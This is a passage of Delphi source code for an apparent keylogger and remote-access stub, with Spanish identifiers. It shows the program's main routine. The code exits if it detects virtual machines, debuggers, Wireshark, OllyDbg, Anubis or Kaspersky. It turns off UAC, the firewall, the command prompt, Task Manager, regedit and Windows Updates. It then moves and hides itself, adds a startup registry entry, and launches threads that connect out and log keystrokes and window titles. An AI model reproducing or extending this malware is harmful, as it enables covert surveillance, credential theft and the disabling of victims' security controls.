      op_virtual_pc := regex(contenido, '[op_virtual_pc]', '[op_virtual_pc]');
      op_virtual_box := regex(contenido, '[op_virtual_box]',
        '[op_virtual_box]');
      op_debug := regex(contenido, '[op_debug]', '[op_debug]');
      op_wireshark := regex(contenido, '[op_wireshark]', '[op_wireshark]');
      op_ollydbg := regex(contenido, '[op_ollydbg]', '[op_ollydbg]');
      op_anubis := regex(contenido, '[op_anubis]', '[op_anubis]');
      op_kaspersky := regex(contenido, '[op_kaspersky]', '[op_kaspersky]');
      op_vmware := regex(contenido, '[op_vmware]', '[op_vmware]');

      op_uac := regex(contenido, '[op_uac]', '[op_uac]');
      op_firewall := regex(contenido, '[op_firewall]', '[op_firewall]');
      op_cmd := regex(contenido, '[op_cmd]', '[op_cmd]');
      op_run := regex(contenido, '[op_run]', '[op_run]');
      op_taskmgr := regex(contenido, '[op_taskmgr]', '[op_taskmgr]');
      op_regedit := regex(contenido, '[op_regedit]', '[op_regedit]');
      op_updates := regex(contenido, '[op_updates]', '[op_updates]');

      if (op_virtual_pc = '1') then
      begin
        if (check_antis('virtual_pc')) then
        begin
          ExitProcess(0);
        end;
      end;

      if (op_virtual_box = '1') then
      begin
        if (check_antis('virtual_box')) then
        begin
          ExitProcess(0);
        end;
      end;

      if (op_debug = '1') then
      begin
        if (check_debug()) then
        begin
          ExitProcess(0);
        end;
      end;

      if (op_wireshark = '1') then
      begin
        if (check_wireshark()) then
        begin
          ExitProcess(0);
        end;
      end;

      if (op_ollydbg = '1') then
      begin
        if (check_ollydbg()) then
        begin
          ExitProcess(0);
        end;
      end;

      if (op_anubis = '1') then
      begin
        if (check_antis('anubis')) then
        begin
          ExitProcess(0);
        end;
      end;

      if (op_kaspersky = '1') then
      begin
        if (check_kaspersky()) then
        begin
          ExitProcess(0);
        end;
      end;

      if (op_vmware = '1') then
      begin
        if (check_antis('vmware')) then
        begin
          ExitProcess(0);
        end;
      end;

      //

      if (op_uac = '1') then
      begin
        disable_uac('on');
      end;

      if (op_firewall = '1') then
      begin
        disable_firewall('seven', 'on');
      end;

      if (op_cmd = '1') then
      begin
        disable_cmd('on');
      end;

      if (op_run = '1') then
      begin
        disable_run('on');
      end;

      if (op_taskmgr = '1') then
      begin
        disable_taskmgr('on');
      end;

      if (op_regedit = '1') then
      begin
        disable_regedit('on');
      end;

      if (op_updates = '1') then
      begin
        disable_updates('on');
      end;

      //

      if (op_i_use_this = '1') then
      begin
        dir_hide := path;
      end
      else
      begin
        dir_hide := GetEnvironmentVariable(paths) + '/';
      end;

      dir := dir_hide + folder + '/';

      if not(DirectoryExists(dir)) then
      begin
        CreateDir(dir);
      end;

      ChDir(dir);

      nombrereal := ExtractFileName(paramstr(0));
      rutareal := dir;
      yalisto := dir + nombrereal;
      keylogger_logs := dir + 'logs.html';

      MoveFile(PChar(paramstr(0)), PChar(yalisto));

      savefile('logs.html',
        '<style>body {background-color: black;color:#00FF00;cursor:crosshair;}</style>');

      if (op_hide_file = '1') then
      begin
        hide_file(PChar(dir));
        hide_file(PChar(yalisto));
        hide_file(PChar(keylogger_logs));
      end;

      if (op_startup = '1') then
      begin
        add_startup(PChar(nombre_registro), PChar(yalisto));
      end;

      //

      // Writeln('Online');
      BeginThread(nil, 0, @conexion_now, nil, 0, PDWORD(0)^);
      BeginThread(nil, 0, @keylogger_teclas, nil, 0, PDWORD(0)^);
      BeginThread(nil, 0, @keylogger_ventanas, nil, 0, PDWORD(0)^);

      while (1 = 1) do
        Sleep(100);
    end
    else
    begin
      // Writeln('OffLine');
      Exit;
    end;

  except
    //
  end;

end.

// The End ?
